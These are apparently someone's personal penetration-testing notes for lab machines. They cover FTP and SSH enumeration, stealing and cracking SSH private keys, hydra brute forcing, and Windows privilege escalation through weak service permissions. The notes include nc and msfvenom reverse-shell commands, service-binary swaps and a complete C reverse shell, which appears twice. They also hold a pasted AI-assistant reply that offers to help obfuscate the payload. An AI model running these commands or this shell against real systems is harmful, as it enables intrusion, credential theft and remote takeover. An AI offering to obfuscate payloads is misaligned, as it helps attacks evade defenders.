#This is about general recommendations

Believe in yourself you can do it!

Check nmap from wider to narrow.

  Take a note ports and software versions.
    Are you already recognised some of them take note! Don't attack
  IS THERE A WEIRD PORT! Take a note!

Probably there are low hanging fruits!
  DON'T BE RUSH

NOW DO YOU BELIEVE YOU TOOK EVERYTHING NOTES!
  ARE THERE STILL SO MUCH DETAIL - MAKE IT SHORTER

AND IF YOU ARE READY LET's THINK ABOUT IT

LET's DECIDE ABOUT OS
  IS IT OBVIOUS WINDOWs or LINUX
    Which version Win which kernel and dist linux? 

TAKE A NOTE!!!
ALSO WRITE TO PAPER! I AM OLD SCHOOL AND I DON't TRUST THE MACHINES!
    
WHICH PORTS ARE OPEN

 21? or ANY FTP -> 


                            it means you will check 
                                            ftp://anonymous:anonymous@10.10.10.98 
                                            wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
                                            wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all


                                            netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ls
                                            netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file <FILE>
                                            netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE> <FILE

                                            wget -m ftp://[username]:[password]@[host] ⇒ download all files

ftp [host] OR ftp [username]@[host]
Run help for a more comprehensive list of commands.
ls
binary ⇒ transfer binary file
ascii ⇒ transfer text file
put [file] ⇒ upload
get [file] ⇒ download
mget * ⇒ get all files
close




                            and see where are the keys and types of them 
  22? or ANY SSH -> 


                            it means you will check 
                                            /etc/ssh/ssh_config 
                            and see where are the keys and types of them 
                                            ~/.ssh/config
                                            /home/user/.ssh/id_rsa  -  .pub
                                            /home/user/.ssh/id_dsa  -  .pub
                                            /home/user/.ssh/id_ecdsa  -  .pub
                                            /home/user/.ssh/id_ed25519  -  .pub
                            AND ETC... MAYBE   ssh_config
                                               sshd_config
                                               authorized_keys
                                               ssh_known_hosts
                                               known_hosts
                                               id_rsa
                            WINDOWS
                                          C:\Users\username\.ssh\known_hosts
                                          C:\Users\MyUser/.ssh/id_rsa
                                          C:\Users\username\.ssh
                                          %APPDATA%\SSH\UserKeys
                            ON CMD OR POWERSHELL
                                          cd %userprofile%.ssh
                            OR
                                          type ~\.ssh\id_rsa.pub | clip

                                          
                            AFTER GOT THE FILE you may need to crack it!
                            FIRST 
                                sudo chmod 600 user_id_rsa or pub
                                ssh -i user_id_rsa user@$IP -p 2222
                            if it asked passphrase you should crack it use 
                                ssh2john user_id_rsa > user.hash
                                john user.hash --wordlist=/usr/share/wordlist/rockyou.txt
                            also you can check hashcat mode if you see any error but don't forget if it takes so long you do something wrong
                            also check 
                                ~/.john/john.pot
                            IF THERE IS AN ISSUE STILL CHECK OTHER FILES MAYBE THERE ARE SOME RULES YOU NEED TO USE IT!                              
                            BUT DON't FORGET THIS IS NOT ONLY FOR STEALING BUT ALSO GIVING YOUR SELF AUTHORIZATION
                                ssh-keygen -t rsa
                            IT WILL WRITE WHERE YOU ARE WRITING YOUR PUB AND PRIVATE KEY

                            ssh [domain]\\[username]@[host] -p [port]
hydra -l [username] -P [wordlist] -s [port] ssh://[host]

  21 - FTP

  80 - HTTP

https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html

PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  ssl/https
bash
nc -v domain.com 80 # GET / HTTP/1.0
openssl s_client -connect domain.com:443 # GET / HTTP/1.0



  https://notes.benheater.com/books/file-transfers-and-data-exfiltration/page/http



#Windows
##Windows services
PS
  Get-service
  Get-Service | select-object Displayname, Status, ServiceName, Can*
  Get-CimInstance -ClassNAme win32_service | Select Name,State,PathName | Where-Object {$_.State-like 'Running'}
  Get-CimInstance -ClassNAme win32_service | Select Name,State,PathName
THIS WORK CMD AND PS
  sc.exe query
THIS WORK ONLY PS
  sc.exe query | select-string service_name
Administraotr CMD  
  sc.exe stop SERVICE
  sc.exe start SERVICE
  sc.exe qc SERVICE
  sc.exe config SERVICE binPath="C:\Users\Quickemu\Downloads\malicious.exe"
  sc.exe sdshow SERVICE
    ConvertFrom-SddlString -Sddl SDDL
    ^https://www.advancedinstaller.com/forums/viewtopic.php?t=49990
PS
  wmic process list full | select-string 'executablepath=C:'
  wmic process list full | select-string 'executablepath=C:' | select-string -notmatch 'system32|syswow'
ADD NEW SERVICE
CMD
  sc.exe create SERVICENAME binPath="PATH-TO-EXECUTABLE"

Linux Compile
  X86_64-w64-ming32-gcc -mwindows -municode -O2 -s -o simpleService.exe simpleService.c
  ^https://gist.github.com/mmmunk/0b0adbccb6b91e778e3a6c6b47908c9c

####ONE BASIC MOVEMENT FOR TRANSFER
Linux
  nc -lnvp 4321 < simpleService.exe
Windows CMD
  cd Downloads
  .\nc64.exe 192.168.122.1 4321 > simpleService.exe
  
TARGET MACHINE ADMIN CMD
  sc.exe create SimpleService binPAth= "C:\USers\Quickemu\Downloads\simpleService.exe"
  sc.exe qc SimpleService
  sc.exe start SimpleService
  sc.exe stop SimpleService
  sc.exe delete SimpleService

  nssm.cc - > download it then
      nssm.exe install SERVICENAME

#WINDOWS PRIVESC AMAZING WEBSITE
https://xorond.com/posts/2021/04/windows-local-privilege-escalation/


###WEAK SERVICE PERMISION
  Service Configuration
    sc.exe qc SimpleService
      >>>>accesschk64 
        https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
    .\accesschk64.exe /accepteula -uwcqv SimpleService
              Linux
                  nc -lnvp 4321 < accesschk64.exe
              Windows CMD
                  cd Downloads
                  .\nc64.exe 192.168.122.1 4321 > accesschk64.exe
  as admin on cmd
    sc.exe config SimpleService binpath="C:\users\quickemu\downloads\simpleService.exe"
    sc.exe config SimpleService binpath="C:\users\quickemu\downloads\nc64.exe 192.168.122.1 4321 -e c:\windows\system32\cmd.exe"
  on kali attacker
    nc -nlvp 4321
  as admin on cmd
    sc.exe start simpleService
  ###SO BASICALY WE CREATE A MALICIOUS EXECUTABLE THAT TRIGGERS A REVERSE SHELL AND WE UPLOAD IT TO THE VICTIM MACHINE
      1$      
      msfvenom -p windows/shlee_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
      2>
      sc.exe config SimpleService binpath="C:\users\quickemu\downloads\malicious.exe"
      3$
      nc -nlvp 7777
      4>
      sc.exe stop SimpleService
      sc.exe start SimpleService
      5*
Service Binary
  PS
    Get-CimInstance -ClassName win32_service | select name,state,pathname | where-object {$_.State -like 'Running'}
    icacls.exe .\simpleService.exe
    1$      
      msfvenom -p windows/shlee_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
      2>
      cp .\simpleService.exe .\simpleService.exe.bkp
      cp .\malicious.exe .\simpleService.exe
      3$
      nc -nlvp 7777
      ADMIN ON CMD
      4>
      sc.exe stop SimpleService
      sc.exe start SimpleService
      5*
    

  
  Service enumeration with winPEAS

another interesting link
https://www.narycyber.com/posts/privilege-escalation/windows/setting-up-a-lab/

I THINK THIS IS AWESOME TOO
https://juggernaut-sec.com/weak-service-permissions-windows-privilege-escalation/





🧬 Minimal C Reverse Shell (No msfvenom)
c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;

    // Replace with your attacker's IP and port
    char *ip = "192.168.1.100";
    int port = 4444;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    connect(sock, (struct sockaddr *)&server, sizeof(server));

    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr

    execl("/bin/sh", "sh", NULL);

    return 0;
}
🛠️ How to Compile and Use
bash
gcc -o revshell revshell.c
./revshell
Make sure your listener is running on the attacker's machine:

bash
nc -lvnp 4444
⚠️ Legal and Ethical Use
This code is for educational and authorized penetration testing purposes only. Never deploy reverse shells on systems without explicit permission.

Would you like help obfuscating this payload or converting it to a Windows-compatible version?


```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;

    // Replace with your attacker's IP and port
    char *ip = "192.168.1.100";
    int port = 4444;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    connect(sock, (struct sockaddr *)&server, sizeof(server));

    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr

    execl("/bin/sh", "sh", NULL);

    return 0;
}

```


